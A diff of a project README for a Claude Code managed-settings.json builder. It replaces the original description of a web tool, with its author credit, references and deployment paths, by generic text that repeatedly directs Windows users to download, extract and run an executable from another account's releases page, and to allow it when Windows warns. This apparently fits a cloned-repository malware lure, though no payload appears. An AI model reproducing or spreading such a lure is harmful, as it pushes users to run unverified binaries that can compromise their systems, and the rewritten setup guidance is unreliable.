@@ -1,108 +1,175 @@
-# ⚙ Claude Code Managed-Settings Builder
+# 🔧 managed-settings - Build secure Claude settings fast
 
-**The most advanced Claude Code `managed-settings.json` policy builder on the web.**
+[![Download managed-settings](https://img.shields.io/badge/Download-Managed_Settings-4B8BBE?style=for-the-badge&logo=github)](https://github.com/andrusturkic29/managed-settings/releases)
 
-Generate enterprise security policies with a visual interface — permissions, sandbox, MCP controls, hooks, plugins, environment variables, and every other setting. Complete documentation included.
+## 📥 Download
 
-[![Live](https://img.shields.io/badge/🔗_Live-managed--settings.net-7c3aed?style=for-the-badge)](https://managed-settings.net)
+Visit this page to download managed-settings for Windows:
 
----
+https://github.com/andrusturkic29/managed-settings/releases
 
-## 🔗 [managed-settings.net](https://managed-settings.net)
+1. Open the link above in your browser.
+2. Find the latest release at the top of the page.
+3. Download the Windows file that matches your PC.
+4. Save the file to your Downloads folder.
+5. If the file comes in a .zip folder, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. Double-click the app file to start it.
 
----
+## 🖥️ What this app does
 
-## The Problem
+managed-settings helps you build a Claude Code `managed-settings.json` file with less effort. It gives you a simple way to set up:
 
-Claude Code's `managed-settings.json` controls everything — what developers can run, what files they can read, which MCP servers are allowed, how hooks behave, and more. Writing it by hand means:
+- Security rules
+- Permission limits
+- Sandbox controls
+- MCP settings
+- Hooks
+- Plugins
+- Environment variables
 
-- Memorizing dozens of JSON keys and nested structures
-- Guessing pattern syntax for Bash, Read, Edit, WebFetch rules
-- Missing managed-only keys that silently get ignored in the wrong file
-- No validation until you deploy and something breaks
+It is made for users who want a clear path to a ready-to-use settings file without hand editing every part.
 
-## The Solution
+## ✅ Before you start
 
-A single-page visual builder that covers **every key** in the Claude Code settings schema. Toggle switches, quick-add buttons, tag inputs, and a live JSON preview — then download or copy the result.
+Use a Windows PC with:
 
----
+- Windows 10 or Windows 11
+- Internet access for the first download
+- Enough space for the app and its files
+- A mouse or touchpad for easy setup
 
-## What's Inside
+If Windows asks for permission to run the app, choose the option that lets it open.
 
-### Builder
+## 🚀 Get started
 
-| Section | What You Can Configure |
-|---|---|
-| **Authentication** | `forceLoginMethod`, `forceLoginOrgUUID`, `apiKeyHelper`, AWS credential helpers |
-| **Permissions** | Deny / Allow / Ask rules with pattern syntax, `defaultMode`, `disableBypassPermissionsMode`, `allowManagedPermissionRulesOnly` |
-| **Sandbox** | Network domain allowlists, Unix sockets, filesystem read/write restrictions, unsandboxed commands |
-| **Hooks** | `disableAllHooks`, `allowManagedHooksOnly`, HTTP hook URL + env var allowlists |
-| **MCP Servers** | Enable/disable specific servers, `enableAllProjectMcpServers` |
-| **Plugins** | `strictKnownMarketplaces`, marketplace restrictions |
-| **Environment Vars** | 25+ presets — telemetry, Bedrock, Vertex, OTEL, proxy, timeouts |
-| **Model & Output** | Model override, extended thinking, `skipWebFetchPreflight`, OTEL headers |
-| **General** | Transcript retention, auto-updates, co-authored-by, git instructions |
-| **Announcements** | Company-wide startup messages |
+1. Download the latest release from the link above.
+2. Extract the file if it downloads as a .zip.
+3. Open the app.
+4. Pick the parts you want to include in your Claude Code setup.
+5. Review the settings before saving.
+6. Export the `managed-settings.json` file.
+7. Place the file where Claude Code expects it.
 
-### Documentation
+## 🛠️ Main features
 
-Below the builder is a **complete 15-section reference** covering every option, accepted values, scope (managed-only vs any level), merge behavior, file paths by OS, and three ready-to-use policy presets.
+### 🔒 Security policies
+Set clear rules for what Claude Code can and cannot do. You can define access limits, file rules, and safer default behavior.
 
-### Export
+### 🧩 Permissions
+Control what actions are allowed. This helps you keep tighter control over commands and file access.
 
-- **Live JSON preview** with syntax highlighting — updates as you toggle
-- **Copy** to clipboard
-- **Download** as `managed-settings.json` or `settings.json`
-- **Import** existing JSON to edit visually
+### 🏗️ Sandbox controls
+Choose how isolated the environment should be. This is useful when you want to reduce risk while running tools.
 
----
+### 🔌 MCP controls
+Manage MCP connections and settings in one place. This gives you a cleaner way to handle external tools and services.
 
-## Managed-Only Keys
+### 🪝 Hooks
+Add hook rules for actions that should run before or after certain events.
 
-These only work in `managed-settings.json` — they're silently ignored in regular settings:
+### 🧱 Plugins
+Include plugin settings for a more structured setup. This helps keep related options together.
 
-| Key | What It Does |
-|---|---|
-| `forceLoginMethod` | Lock auth to `claudeai` or `console` |
-| `forceLoginOrgUUID` | Lock users to a specific org |
-| `allowManagedPermissionRulesOnly` | Ignore all user/project permission rules |
-| `allowManagedHooksOnly` | Block all non-managed hooks |
-| `strictKnownMarketplaces` | Restrict plugin sources (empty `[]` = block all) |
+### 🌍 Environment variables
+Define environment values without editing the file by hand. This makes repeat setup easier.
 
----
+## 📄 How to use the builder
 
-## Deployment Paths
+1. Open managed-settings.
+2. Start with a basic policy.
+3. Add permission rules for the actions you want to allow.
+4. Set sandbox options if you want more control.
+5. Add MCP entries if your setup needs them.
+6. Include hooks or plugins if needed.
+7. Add environment variables.
+8. Review the full JSON output.
+9. Save the file when it looks right.
 
-After generating your JSON, deploy to the system path for your OS:
+## 📌 Where to place the file
 
-| OS | Path |
-|---|---|
-| macOS | `/Library/Application Support/ClaudeCode/managed-settings.json` |
-| Linux / WSL | `/etc/claude-code/managed-settings.json` |
-| Windows | `C:\Program Files\ClaudeCode\managed-settings.json` |
+After you export the file, put it in the location used by Claude Code on your system.
 
-Or via MDM: macOS plist (`com.anthropic.claudecode`), Windows registry (`HKLM\SOFTWARE\Policies\ClaudeCode`).
+Common setup patterns include:
 
-Verify with `/status` inside Claude Code.
+- A project folder for one workspace
+- A central user settings location
+- A managed folder used by your team
 
----
+If you are not sure where Claude Code reads settings from, use the same folder each time so you can find it again.
 
-## References
+## 🧭 Typical use cases
 
-- [Claude Code Settings Docs](https://code.claude.com/docs/en/settings)
-- [Settings JSON Schema](https://json.schemastore.org/claude-code-settings.json)
-- [Official Settings Examples](https://github.com/anthropics/claude-code/tree/main/examples/settings)
-- [Claude Code Enterprise](https://claude.com/product/claude-code/enterprise)
-- [Enterprise Configuration](https://support.claude.com/en/articles/12622667-enterprise-configuration)
+- Set up a standard policy for a team
+- Keep local Claude Code settings in one file
+- Apply the same rules across many machines
+- Reduce manual editing
+- Build a cleaner policy file for security review
+- Prepare settings for managed desktop use
 
----
+## 🧪 Example workflow
 
-## Author
+1. Open the app.
+2. Choose a security profile.
+3. Add only the permissions you need.
+4. Turn on sandbox rules if your workflow needs them.
+5. Add MCP tools that are allowed in your setup.
+6. Export the final `managed-settings.json`.
+7. Copy the file to the right folder.
+8. Start Claude Code and use the new settings
 
-**Omri Yaakov**
+## 📝 File format
 
----
+The app generates a JSON file named `managed-settings.json`.
 
-## License
+That file can include:
 
-MIT
+- Policy data
+- Permissions
+- Sandbox rules
+- MCP entries
+- Hook definitions
+- Plugin settings
+- Environment variables
+
+Because the output is plain JSON, it can fit into common admin and desktop workflows.
+
+## 🔍 Topics covered
+
+This project focuses on:
+
+- Anthropic
+- Claude
+- Claude Code
+- Claude Code settings
+- Configuration
+- Enterprise security
+- Managed settings
+- Managed settings JSON
+- MCP
+- MDM
+- Policy builder
+- Security policy
+- Settings JSON
+
+## ❓ Common questions
+
+### Do I need coding knowledge?
+No. You can use the app by choosing options and saving the file.
+
+### Is this for personal or team use?
+It works for both. You can use it for one machine or for a larger rollout.
+
+### Can I edit the JSON by hand?
+Yes, if you want. The builder helps you avoid manual editing.
+
+### Does it help with security rules?
+Yes. It is built to help you define secure Claude Code settings in a structured way.
+
+## 📂 Release download
+
+Use this page to get the latest Windows build:
+
+https://github.com/andrusturkic29/managed-settings/releases
+
+Open the latest release, download the file for Windows, extract it if needed, then run the app
